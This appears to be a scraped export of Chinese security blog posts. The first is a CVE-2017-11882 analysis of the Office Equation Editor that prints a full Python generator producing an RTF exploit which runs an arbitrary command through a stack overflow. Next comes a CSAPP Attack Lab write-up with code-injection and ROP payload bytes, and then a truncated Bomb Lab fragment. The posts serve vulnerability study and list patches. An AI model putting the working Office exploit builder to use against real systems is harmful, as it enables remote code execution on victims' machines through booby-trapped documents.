[{"content":"漏洞描述  成因：Office的公式编辑器EQNEDT32.EXE读入包含MathType的OLE数据，在拷贝公式字体名称前没有对名称长度进行校验，当EQNEDT32.EXE尝试将字体名称复制到本地创建的缓冲区时，攻击者可以通过刻意构造的数据内容覆盖栈上的函数返回地址，从而劫持程序流程。 影响版本：Office 2003到2016的所有版本 POC：https://github.com/Ridter/CVE-2017-11882  漏洞复现   环境\nMicrosoft Windows XPProfessional版本2002 Service Fack 3\nOffice2003SP3\n  复现过程\n下载poc，输出test.doc，将test.doc复制到相应环境下，双击打开即可。\n漏洞分析  环境 Winxp x32 Office2003 工具 windbg IDA Pro  漏洞发生点如下图所示：\n可以看到，函数给SrcStr变量分配的大小是0x24个字节，长度超过该大小就会造成栈溢出。微软后续的补丁将大小限制为0x20可能是为了安全起见。\n触发逻辑\n构造POC 由于该漏洞涉及到MathType公式数据在OLE中的结构，所以我们需要熟悉其结构分布。整个“Equation Native”的数据构成为：\nEquation Native Stream Data = EQNOLEFILEHDR + MTEFData，其中\nMTEFData = MTEF header + MTEF Byte Stream\nEQNOLEFILEHDR 头的结构\nstruct EQNOLEFILEHDR {\rWORD cCBHdr; // 格式头长度,大小为0x1C\rDWORD nVersion; // 固定为0×00020000。\rWORD nCf; // 该公式对象的剪贴板格式\rDWORD cbObject; // MTEF数据的长度，不包括头部\rDWORD nReserved1; // 未使用\rDWORD nReserved2; // 未使用\rDWORD nReserved3; // 未使用\rDWORD nReserved4; // 未使用\r};\rMTEF header 的结构，里面存放一些版本信息\n   Description Size (byte) Value Comment     MTEF Version 1 0x3 MTEFv3   Generating Platform 1 0x1 Windows   Generating Product 1 0x1 Equation Editor   Product Version 1 0x3    Product Subversion 1 0xa     MTEFByte Stream\n   value symbol description     0 END end of MTEF, pile, line, embellishment list, or template   1 LINE line (slot) record   2 CHAR character record   3 TMPL template record   4 PILE pile (vertical stack of lines) record   5 MATRIX matrix record   6 EMBELL character embellishment (e.g. hat, prime) record   7 RULER ruler (tab-stop location) record   8 FONT font name record   9 SIZE general size record   10 FULL full size record   11 SUB subscript size record   12 SUB2 sub-subscript size record   13 SYM symbol size record   14 SUBSYM sub-symbol size record    我们主要关注的是其中的 FONT 结构，也就是漏洞点，结构如下\n   Description Size (byte) Value Comment     Tag 1 0x8 0x8 denotes Font record   Typeface Number 1 0x5a    Style 1 0x5a    Font Name Variable, NULL terminated “cmd.exe /c calc.exe AAAAAAAAAAAAAAAAAAAAAAAA” + 0x00430c12 Overflow and overwrite return address    大致是这样子\nstruct stuFontRecord {\rBYTE bTag; // 字体文件的tag位0×08\rBYTE bTypeFace; // 字体风格0x5a\rBYTE bStyle; // 字体样式0x5a\rBYTE bFontName[n] // 字体名称,以NULL为结束符,漏洞点\r};\rFont record = tag(固定为8，占一个字节) + typeface(占一个字节) + style(占一个字节) + font_name(以0x00结尾的字符串)\n#poc.py关键注释 #文件头 包含字符集 支持字符 缺省字体 字体表 生成器 {\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}} #版本信息 {\\*\\generator Riched20 6.3.9600} #正常视图 单字节 \\viewkind4\\uc1 #段落文本属性 \\pard\\sa200\\sl276\\slmult1 # 字体 大小  \\f0\\fs22\\lang9 #控制字 自动更新ole对象 {\\object\\objemb\\objupdate #公式对象 {\\object\\objemb\\objupdate{\\*\\objclass Equation.3}\\objw380\\objh260{\\*\\objdata #poc.py完整 import argparse import sys RTF_HEADER = R\u0026#34;\u0026#34;\u0026#34;{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}} {\\*\\generator Riched20 6.3.9600}\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9\u0026#34;\u0026#34;\u0026#34; RTF_TRAILER = R\u0026#34;\u0026#34;\u0026#34;\\par} \u0026#34;\u0026#34;\u0026#34; OBJECT_HEADER = R\u0026#34;\u0026#34;\u0026#34;{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}\\objw380\\objh260{\\*\\objdata \u0026#34;\u0026#34;\u0026#34; #对象区\\resul结果对象控制字，结果目标包含了该对像的最后更新结果。这样//允许那些不能识别对象或者不能使用该特定类型对象的旧的RTF阅读器使用当//前的对象值来替换该对象，从而保持其外观显示。 OBJECT_TRAILER = R\u0026#34;\u0026#34;\u0026#34; }{\\result {\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 {\\pict{\\*\\picprop\\shplid1025{\\sp{\\sn shapeType}{\\sv 75}}{\\sp{\\sn fFlipH}{\\sv 0}} {\\sp{\\sn fFlipV}{\\sv 0}}{\\sp{\\sn fLockAspectRatio}{\\sv 1}}{\\sp{\\sn pictureGray}{\\sv 0}}{\\sp{\\sn pictureBiLevel}{\\sv 0}}{\\sp{\\sn fRecolorFillAsPicture}{\\sv 0}}{\\sp{\\sn fUseShapeAnchor}{\\sv 0}}{\\sp{\\sn fFilled}{\\sv 0}}{\\sp{\\sn fHitTestFill}{\\sv 1}} {\\sp{\\sn fillShape}{\\sv 1}}{\\sp{\\sn fillUseRect}{\\sv 0}}{\\sp{\\sn fNoFillHitTest}{\\sv 0}}{\\sp{\\sn fLine}{\\sv 0}}{\\sp{\\sn fPreferRelativeResize}{\\sv 1}}{\\sp{\\sn fReallyHidden}{\\sv 0}} {\\sp{\\sn fScriptAnchor}{\\sv 0}}{\\sp{\\sn fFakeMaster}{\\sv 0}}{\\sp{\\sn fCameFromImgDummy}{\\sv 0}}{\\sp{\\sn fLayoutInCell}{\\sv 1}}}\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0 \\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307{\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02 00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}} \u0026#34;\u0026#34;\u0026#34; #Equation Native数据流 OBJDATA_TEMPLATE = R\u0026#34;\u0026#34;\u0026#34; 01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1 b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001 0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000 000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000 0000000000000000000000000000000000000000000000000000001400000000000000010043006f 006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000 00000000000000000000000000000000000000000000000000000000000000010000006600000000 00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff ffffff00000000000000000000000000000000000000000000000000000000000000000000000003 0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffff01000002080000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02 ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e 30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000 00000000000000000000000000000000000000000000000000000000000000000000000000030004 00000000000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4 ee5b0000000000030101030a0a01085a5a4141414141414141414141414141414141414141414141 414141414141414141414141414141414141414141120c4300000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000004500710075 006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000 0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000 0000000000000000000000000000000000000000000000000000000000000004000000c500000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff ffffff00000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 000000000000000000000000000000000000000000000000000000000000000000000000000000ff ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000000000000000000000 00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000001050000050000000d0000004d 45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500 000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00 050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00 ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468 54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65 7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001 90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131 0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131 31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000 0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff 7cef1800040000002d01010004000000f0010000030000000000 \u0026#34;\u0026#34;\u0026#34; COMMAND_OFFSET = 0x949*2 def create_ole_exec_primitive(command): if len(command) \u0026gt; 43: print \u0026#34;[!] Primitive command must be shorter than 43 bytes\u0026#34; sys.exit(0) hex_command = command.encode(\u0026#34;hex\u0026#34;) objdata_hex_stream = OBJDATA_TEMPLATE.translate(None, \u0026#34;\\r\\n\u0026#34;) ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):] return OBJECT_HEADER + ole_data + OBJECT_TRAILER def create_rtf(header,command,trailer): ole1 = create_ole_exec_primitive(command + \u0026#34; \u0026amp;\u0026#34;) # We need 2 or more commands for executing remote file from WebDAV # because WebClient service start may take some time return header + ole1 + trailer def getrheader(file): input_file = open(file,\u0026#34;r\u0026#34;).read() r_header = input_file.split(\u0026#34;{\\*\\datastore\u0026#34;)[0] return r_header if __name__ == \u0026#39;__main__\u0026#39;: parser = argparse.ArgumentParser(description=\u0026#34;PoC for CVE-2017-11882\u0026#34;) parser.add_argument(\u0026#34;-c\u0026#34;, \u0026#34;--command\u0026#34;, help=\u0026#34;Command to execute.\u0026#34;, required=True) parser.add_argument(\u0026#39;-o\u0026#39;, \u0026#34;--output\u0026#34;, help=\u0026#34;Output exploit rtf\u0026#34;, required=True) parser.add_argument(\u0026#34;-i\u0026#34;, \u0026#34;--input\u0026#34;, help=\u0026#34;Input normal rtf.\u0026#34;, required=False) args = parser.parse_args() if args.input != None: r_header = getrheader(args.input) else: r_header = RTF_HEADER rtf_content = create_rtf(r_header, args.command ,RTF_TRAILER) output_file = open(args.output, \u0026#34;w\u0026#34;) output_file.write(rtf_content) print \u0026#34;[*] Done ! output file --\u0026gt; \u0026#34; + args.output 漏洞修复 开发者：在strcpy（）函数之前，校验待拷贝长度是否在合法区间内阻止溢出即可。\n用户只需：\n 下载补丁：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882 将windows更新到最新版本 在注册表中取消该模块的注册，打开cmd.exe，输入以下两条命令：  reg add “HKLM\\SOFTWARE\\Microsoft\\Office\\Common\\COM Compatibility\\{0002CE02-0000-0000-C000-000000000046} ” /v “Compatibility Flags” /t REG_DWORD /d 0x400\rreg add “HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Office\\Common\\COM Compatibility\\{0002CE02-0000-0000-C000-000000000046} ” /v “Compatibility Flags” /t REG_DWORD /d 0x400\r参考链接 https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2010/a329t4ed(v=vs.100)?redirectedfrom=MSDN\nhttps://www.freebuf.com/column/183551.html\nhttps://xz.aliyun.com/t/6668\nhttps://www.anquanke.com/member/117972\nhttps://blog.csdn.net/qq_38474570/article/details/98513146\nhttps://bbs.pediy.com/thread-258371.htm\nhttp://rtf2latex2e.sourceforge.net/MTEF3.html\n","permalink":"https://inten.kro1lsec.com/post/cve-2017-11882%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","summary":"漏洞描述  成因：Office的公式编辑器EQNEDT32.EXE读入包含MathType的OLE数据，在拷贝公式字体名称前没有对名称长度进行校验，当EQNEDT32.EXE尝试将字体名称复制到本地创建的缓冲区时，攻击者可以通过刻意构造的数据内容覆盖栈上的函数返回地址，从而劫持程序流程。 影响版本：Office 2003到2016的所有版本 POC：https://github.com/Ridter/CVE-2017-11882  漏洞复现   环境\nMicrosoft Windows XPProfessional版本2002 Service Fack 3\nOffice2003SP3\n  复现过程\n下载poc，输出test.doc，将test.doc复制到相应环境下，双击打开即可。\n漏洞分析  环境 Winxp x32 Office2003 工具 windbg IDA Pro  漏洞发生点如下图所示：\n可以看到，函数给SrcStr变量分配的大小是0x24个字节，长度超过该大小就会造成栈溢出。微软后续的补丁将大小限制为0x20可能是为了安全起见。\n触发逻辑\n构造POC 由于该漏洞涉及到MathType公式数据在OLE中的结构，所以我们需要熟悉其结构分布。整个“Equation Native”的数据构成为：\nEquation Native Stream Data = EQNOLEFILEHDR + MTEFData，其中\nMTEFData = MTEF header + MTEF Byte Stream\nEQNOLEFILEHDR 头的结构\nstruct EQNOLEFILEHDR {\rWORD cCBHdr; // 格式头长度,大小为0x1C\rDWORD nVersion; // 固定为0×00020000。\rWORD nCf; // 该公式对象的剪贴板格式\rDWORD cbObject; // MTEF数据的长度，不包括头部\rDWORD nReserved1; // 未使用\rDWORD nReserved2; // 未使用\rDWORD nReserved3; // 未使用\rDWORD nReserved4; // 未使用\r};\rMTEF header 的结构，里面存放一些版本信息","title":"CVE-2017-11882漏洞分析"},{"content":"ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctarget\u0026gt;\u0026gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \u0026#34;No exploit. Getbuf returned 0x%x\\n\u0026#34; stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.txt里，并通过hex2raw转换为字符串。并执行程序。\n./hex2raw \u0026lt;touch1.txt\u0026gt;2.txt ./ctarget -qi 2.txt 1.2level 2 要求：要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie\n小建议\n touch2的参数val是利用rdi寄存器进行传递的 你要利用某种方式让getbuf的返回地址为touch2的地址 你的注入代码的传入参数应该等于cookie的值。 不要在注入代码内调用ret或者call 请参见附录B中有关如何使用工具生成字节级表示形式的指令序列的讨论。  touch2的代码如下\nvoid touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\u0026#34;Touch2!: You called touch2(0x%.8x)\\n\u0026#34;, val); validate(2); } else { printf(\u0026#34;Misfire: You called touch2(0x%.8x)\\n\u0026#34;, val); fail(2); } exit(0); } 逻辑：比较我们传入的参数val是否等于cookie的值，如果等于就可以通过。\n本题的关键就是在改变返回地址前也设置rdi寄存器的值。\n插入的汇编代码\nmovq $0x59b997fa, %rdi pushq $0x4017ec ret 查看他的字节序表示\nAttack Lab$ vim l2.s Attack Lab$ gcc -c l2.s Attack Lab$ objdump -d l2.o l2.o： 文件格式 elf64-x86-64 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0:\t48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7:\t68 ec 17 40 00 pushq $0x4017ec c:\tc3 retq stack : padding(00..) + pop_rdi(0x40141b) + arg1(cookies) + touch2(0x4017ec)\n48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 Attack Lab$ ./hex2raw \u0026lt;touch2.txt\u0026gt;2.txt Attack Lab$ ./ctarget -qi 2.txt 1.3level 3 hexmatch和touch3的代码如下。\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \u0026#34;%.8x\u0026#34;, val); //s=val=cookie  return strncmp(sval, s, 9) == 0; //比较cookie和第二个参数的前9位是否相同  // cookie只有8字节。这里为9的原因是我们要比较最后一个是否为\u0026#39;\\0\u0026#39;  } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { //相同则成功  printf(\u0026#34;Touch3!: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); validate(3); } else { printf(\u0026#34;Misfire: You called touch3(\\\u0026#34;%s\\\u0026#34;)\\n\u0026#34;, sval); fail(3); } exit(0); } 任务: 你的任务getbuf之后执行touch3而不是继续执行test。你必须要传递cookie字符串作为参数。每次运行时，堆栈中的地址保持不变，并在堆栈中存储一个字符串。\n小建议\n 你需要在利用缓冲区溢出的字符串中包含cookie的字符串表示形式。该字符串应该有8个十六进制数组成。注意没有前导0x 注意在c语言中的字符串表示会在末尾处加一个\\0 您注入的代码应将寄存器％rdi设置为此字符串的地址 调用函数hexmatch和strncmp时，它们会将数据压入堆栈，从而覆盖存放getbuf使用的缓冲区的内存部分。 因此，您需要注意在哪里放置您的Cookie字符串  字符串必须放在ret地址后面，因为后面函数执行时(在hexmatch函数里,向系统请求了100字节的空间，使可能覆盖变为铁定会覆盖)，会覆盖掉字符串。 而hexmatch比较的是字符串，所以cookie还要转换成字符串(用16进制表示)\n简单分析touch3\n00000000004018fa \u0026lt;touch3\u0026gt;: 4018fa: 53 push %rbx 4018fb: 48 89 fb mov %rdi,%rbx 4018fe: c7 05 d4 2b 20 00 03 movl $0x3,0x202bd4(%rip) # 6044dc \u0026lt;vlevel\u0026gt; 401905: 00 00 00 401908: 48 89 fe mov %rdi,%rsi 40190b: 8b 3d d3 2b 20 00 mov 0x202bd3(%rip),%edi # 6044e4 \u0026lt;cookie\u0026gt; 401911: e8 36 ff ff ff callq 40184c \u0026lt;hexmatch\u0026gt; 401916: 85 c0 test %eax,%eax 逻辑非常简单首先把rdi的值传递给rsi然后把cookie的值传递给rdi调用hexmatch函数。这里rsi的值应该就是我们的字符串数组的起始地址。\n这里我们注意hexmatch函数里也开辟了栈帧。并且还有随机栈偏移动。可以说字符串s的地址我们是没法估计 的。并且提示中告诉了我们hexmatch和strncmp函数可能会覆盖我们getbuf的缓冲区。所以我们的注入代码要放在一个安全的位置。我们可以把它放到text的栈帧中。我们在getbuf分配栈帧之前打一个断点。\nb *0x4017a8 (gdb) b *0x4017a8 Breakpoint 1 at 0x4017a8: file buf.c, line 12. (gdb) r -q #gdb调试时传参数放在里面 Starting program: /csapp/attack/ctarget -q warning: Error disabling address space randomization: Operation not permitted Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.x86_64 Cookie: 0x59b997fa Breakpoint 1, getbuf () at buf.c:12 12 buf.c: No such file or directory. (gdb) info r rsp rsp 0x5561dca0 0x5561dca0 stack : padding(00..) + pop_rdi(0x40141b) + arg1(stack_str) + touch3(0x4018fa) + stack_str(str(cookies))\n48 c7 c7 a8 dc 61 55 68 \u0026lt;-读入我们要执行的汇编语句\rfa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00\r00 00 00 00 00 00 00 00\r00 00 00 00 00 00 00 00\r78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 \u0026lt;-返回地址为rsp Attack Lab$ ./hex2raw \u0026lt;touch3.txt\u0026gt;3.txt Attack Lab$ ./ctarget -qi 3.txt 2.1level 4 思考： 首先要把cookie传入%rdi，然后再转入到touch2函数。\n根据readme.pdf的命令列表，在gadets farm中没有发现popq %rdi。于是可以先popq %rax，然后movq %rax, %rdi\n这里的缓冲区完全被junk填充，然后从getbuf的ret向下执行。用到了两个gadget，所用到的data也放在了栈上。\n方法一\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rcc 19 40 00 00 00 00 00 /* jump 0x4019cc; popq %rax */\rfa 97 b9 59 00 00 00 00 /* cookie */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5; movq %rax, %rdi */\rec 17 40 00 00 00 00 00 /* touch2 */\r方法二\n@le2.txt 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 2b 40 00 00 00 00 00 #pop %rdi fa 97 b9 59 00 00 00 00 #cookie ec 17 40 00 00 00 00 00 #touch2 ./hex2raw \u0026lt; le2.txt | ./rtarget -q 2.2level 5 肝不动了，参考别人的。\n思考：\n同Phase 5一样，这里也需要考虑如何存放cookie字符串，并且多了一个传递字符串地址到%rdi的难题。\n首先，getbuf的缓冲区应该全部填充为junk，那么cookie字符串为了不干扰exploit的正常运行，必然要放在exploit的最后。\n第二个问题，一开始在gadgets farm找到许多如下的操作：\nmov $0x909078fb,%eax lea -0x3c3876b8(%rdi),%eax movl $0xc7c78948,(%rdi) \u0026hellip;\u0026hellip; 所以考虑过能否使用这些数值来拼凑一个地址，然后把cookie字符串放在那里。但是由于有栈随机化，所以这个思路不行。\n后来看了一些解答，发现居然有movq %rsp, %rax这样的神操作，那样就可以用(%rsp) + x的方式来得到cookie字符串的地址了。然后就是一通拼拼凑凑，用了8个gadgets完成了exploit。\nexploit-5 关于这种需要很多gadgets才能完成的exploit，觉得思路肯定是最重要的，但是思路明晰之后，在组成gadgets的链条时，不妨用倒序查找的方法，也许会快一些。当然，今后肯定会使用一些查找gadgets的工具啦。\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\r06 1a 40 00 00 00 00 00 /* jump 0x401a06 ;movq %rsp, %rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rab 19 40 00 00 00 00 00 /* jump 0x4019ab ;popq %rax */\r48 00 00 00 00 00 00 00 /* distance from here to cookie string */\rdd 19 40 00 00 00 00 00 /* jump 0x4019dd ;movl %eax, %edx */\r34 1a 40 00 00 00 00 00 /* jump 0x401a34 ;movl %edx, %ecx */\r13 1a 40 00 00 00 00 00 /* jump 0x401a13 ;movl %ecx, %esi */\rd6 19 40 00 00 00 00 00 /* jump 0x4019d6 ;lea (%rdi,%rsi,1),%rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rfa 18 40 00 00 00 00 00 /* touch3 */\r35 39 62 39 39 37 66 61 /* cookie string */\r00 00 00 00 00 00 00 00 /* string ends with 00 */\r","permalink":"https://inten.kro1lsec.com/post/csapplabattack-lab/","summary":"ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctarget\u0026gt;\u0026gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \u0026#34;No exploit. Getbuf returned 0x%x\\n\u0026#34; stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.","title":"[CSAPPLAB]Attack Lab"},{"content":"总体感觉考查对汇编的理解和熟练度\nphase_1 400e37: 48 89 c7 mov %rax,%rdi //第一个参数 400e3a: e8 a1 00 00 00 callq 400ee0 \u0026lt;phase_1\u0026gt;\r...\r0x0000000000400ee0 \u0026lt;+0\u0026gt;: sub $0x8,%rsp 0x0000000000400ee4 \u0026lt;+4\u0026gt;: mov $0x402400,%esi //第二个参数\r0x0000000000400ee9 \u0026lt;+9\u0026gt;: callq 0x401338 \u0026lt;strings_not_equal\u0026gt;\r让参数一，二相等即可\nBorder relations with Canada have never been better.\nphase_2 利用callq 0x40145c \u0026lt;read_six_numbers\u0026gt;确定字符串格式，\n利用0000000000400F1A add eax, eax让后边的数翻倍\n字符串为“1 2 4 8 16 32”\nphase_3 尝试分析时，发现jcc指令经常弄混，又回去复习了一遍\ncmp oprd1,oprd2 + JNBE/JA 无符号\rcmp oprd1,oprd2 + JNLE/JG 有符号\roprd1\u0026gt;oprd2时跳转\rJZ/JE 